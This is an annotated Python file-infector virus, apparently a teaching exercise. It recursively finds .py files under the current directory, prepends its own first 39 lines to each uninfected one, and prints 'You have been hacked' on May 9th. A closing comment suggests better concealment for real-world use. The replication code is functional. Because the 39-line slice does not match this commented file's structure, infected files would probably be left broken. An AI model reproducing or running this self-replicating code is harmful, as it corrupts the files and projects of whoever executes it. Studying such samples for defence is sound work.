#!/usr/bin/python3
# This line specifies that the script should be run using Python 3.

import os
import datetime
# os: Used for interacting with the operating system, particularly for file and directory operations.
# datetime: Used for obtaining the current date and time.

SIGNATURE = "VIRUS"
# A constant that serves as the signature of the virus to mark infected files.

def locate(path):
    """
    Function: locate
    Purpose: To search and return a list of all Python (.py) files in the given directory 
             and its subdirectories that are not already infected by this virus.
    """
    files_targeted = []
    filelist = os.listdir(path)
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                if SIGNATURE in line:
                    infected = True
                    break
            if not infected:
                files_targeted.append(path+"/"+fname)
    return files_targeted

def infect(files_targeted):
    """
    Function: infect
    Purpose: To insert the virus code into each uninfected Python file identified.
             This is the replication mechanism of the virus.
    """
    virus = open(os.path.abspath(__file__))
    virusstring = ""
    for i, line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close()
    for fname in files_targeted:
        f = open(fname)
        temp = f.read()
        f.close()
        f = open(fname, "w")
        f.write(virusstring + temp)
        f.close()

def detonate():
    """
    Function: detonate
    Purpose: To execute the payload of the virus under specific conditions. 
             In this case, the payload is a simple print statement, and the condition is the date being May 9th.
    """
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        print("You have been hacked")

# Core Python/Coding Tools Used: Functions, os and datetime modules, list operations, file I/O, conditional statements, recursion.
# What kind of malware is this? Answer: This is a virus, a type of malware that replicates by modifying other programs and inserting its own code.

files_targeted = locate(os.path.abspath(""))
# Calling the locate function to find all non-infected Python files in the current directory.

infect(files_targeted)
# Infecting these files with the virus.

detonate()
# Checking the date and detonate if it's May 9th.

# How well is this code written? Would you have done something differently? Answer: The code is basic and lacks error handling, 
# which is crucial for robustness. Additionally, more sophisticated methods for hiding the virus could be implemented in a real-world scenario.
